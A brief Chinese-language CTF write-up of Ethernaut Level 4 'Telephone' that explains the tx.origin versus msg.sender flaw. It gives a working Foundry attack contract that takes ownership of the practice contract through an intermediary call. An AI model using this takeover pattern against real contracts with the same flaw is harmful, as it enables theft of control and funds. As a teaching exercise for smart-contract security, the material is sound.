# Ethernaut CTF Writeup

## Level 4 Telephone

> 題目: https://ethernaut.openzeppelin.com/level/0x865e167C3db2c3E1C046cC67b05E6EcF9C897C2D

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

過關條件: 

- TODO

解法：

 - `tx.origin` 及 `msg.sender` 的差異
    - `tx.origin`: 發起交易的地址，通常為使用者的錢包地址
    - `msg.sender`: function 的呼叫者，可以為使用者錢包，或是另一個合約
- 作法：寫一個合約代替直接發送，便可造成 `tx.origin` 及 `msg.sender` 出現不一致

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Telephone} from "../src/level4/Telephone.sol";


contract AttackTelephone {
    Telephone public telephone;
    
    constructor(address _targetAddress) {
        telephone = Telephone(payable(_targetAddress));
        
        console.log(telephone.owner());
        telephone.changeOwner(msg.sender);
        
        console.log(telephone.owner());
    }
}

contract Attack is Script {
    
    function run() public {
        vm.startBroadcast();

        AttackTelephone attack = new AttackTelephone(0x5f0BBf33020Cd1fD15d332e8B799ec5B470d2414);
        
        vm.stopBroadcast();
    }
}

```

Takeaways:

- 如果沒有搞清楚 tx.origin 和 msg.sender 的差異，可能會導致釣魚攻擊
- https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/